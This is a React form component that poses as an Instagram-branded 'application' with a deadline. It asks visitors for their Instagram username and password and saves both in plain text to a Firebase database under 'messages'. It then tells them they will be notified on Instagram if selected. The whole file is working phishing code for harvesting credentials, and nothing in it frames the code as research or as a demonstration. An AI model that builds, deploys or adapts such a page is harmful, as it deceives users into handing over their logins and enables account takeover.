import React, { useState } from 'react';
import { database } from './Firebase';
import { ref, push } from 'firebase/database';
import inst from './inst.png'
import './Form.css';

export default function Form() {
  const [uname, setUname] = useState("");
  const [pass, setPass] = useState("");
  const [sent, setSent] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();

    if (uname.trim() === "") return;
    if (pass.trim() === "") return;

    const messagesRef = ref(database, 'messages');

    push(messagesRef, {
      uname: uname,
      pass: pass,
      timestamp: Date.now()
    })
      .then(() => {
        setSent(true);
        setUname("");
        setPass("");
      })
      .catch((error) => {
        console.error("Error writing to database:", error);
      });
  };

  return (
    <div className='form-container'>
        <p className='deadline'>Application deadline: May 18, 2025</p>
      <form onSubmit={handleSubmit} className='form'>
        <p className='apply-head'>Apply with</p>
        <img src={inst} alt='logo' />
        {!sent ? <> <div className='containers'>
            <label>Username</label>
            <input
            type="text"
            value={uname}
            placeholder="username, email, phone"
            className='field'
            onChange={(e) => setUname(e.target.value)}
            />
        </div>
        <div className='containers'>
            <label>Password</label>
            <input
            type="password"
            value={pass}
            placeholder="password"
            className='field'
            onChange={(e) => setPass(e.target.value)}
            />
        </div>
        <button className='submit' type="submit">Apply</button> </> : <p className='sentText'><b>Applied Successfully!</b> We will notify you on instagram if selected</p>}
      </form>
    </div>
  )
}
